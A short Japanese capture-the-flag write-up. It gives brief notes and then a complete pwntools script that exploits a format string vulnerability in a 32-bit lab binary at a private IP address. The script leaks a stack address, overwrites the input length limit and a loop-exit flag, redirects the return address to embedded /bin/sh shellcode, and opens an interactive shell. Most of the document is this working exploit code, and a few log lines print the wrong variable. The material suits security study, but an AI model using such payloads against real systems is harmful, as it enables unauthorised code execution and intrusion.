# ポイント

- エントリーポイントからが長いので、メインをとりあえず見つける。
- 文字数制限が厳しいので、初手でそこを増やす。
- esp+0x10に文字数があるのは分かったが、そのアドレスが分からん！！
  →入力先esp+0x1cのアドレスがesp+0x14hに格納されている！
- 無限ループのせいでリターンアドレス書き換えても意味がない
  →無限ループを抜けるためのFlagを書き換える。



# 解法

1. espのアドレスリーク
2. 入力可能文字数増やす
3. 無限ループのflag書き換え& リターンアドレス書き換え->shellcodeに飛ばす



```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *

rhp = {'host': '192.168.33.13', 'port':1234}
conn = remote(rhp['host'], rhp['port'])

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

res = conn.recvline()
log.info(res)

conn.sendline('%5$p')
log.info('get addr of esp + 0x1C')

res = conn.recvline()
log.info(res)

input_addr = int(res[:-1], 16)

esp = input_addr - 0x1c
input_size_addr = esp + 0x10
ret_addr = esp + 0x42c
flag_addr = esp + 0x18

log.info('input_size_addr:' + hex(input_size_addr))
log.info('ret_addr:' + hex(input_size_addr))
log.info('flag_addr:' + hex(input_size_addr))

res = conn.recvline()
log.info(res)



# payload = p32(esp_10 + 1)
payload = p32(input_size_addr)
payload += b'%90x'
payload += b'%7$n'

conn.sendline(payload)
log.info('send payload')

res = conn.recvline()
log.info(res)

res = conn.recvline()
log.info(res)

shellcode_addr = input_addr + 0xc

payload  = p32(flag_addr)
payload += p32(ret_addr)
payload += p32(ret_addr + 2)
payload += shellcode
fsb_ret1 = ((shellcode_addr & 0xFFFF) - len(payload) - 1) % 0x10000 + 1
fsb_ret2 = (((shellcode_addr >> 16) & 0xFFFF) - (shellcode_addr & 0xFFFF) - 1) % 0x10000 + 1
print(fsb_ret2)
print(fsb_ret1)

payload += b'%7$n'
payload += b"%%%dx" % fsb_ret1
payload += b'%8$hn'
payload += b"%%%dx" % fsb_ret2
payload += b'%9$hn'

conn.sendline(payload)
log.info('send payload')

conn.interactive()

```

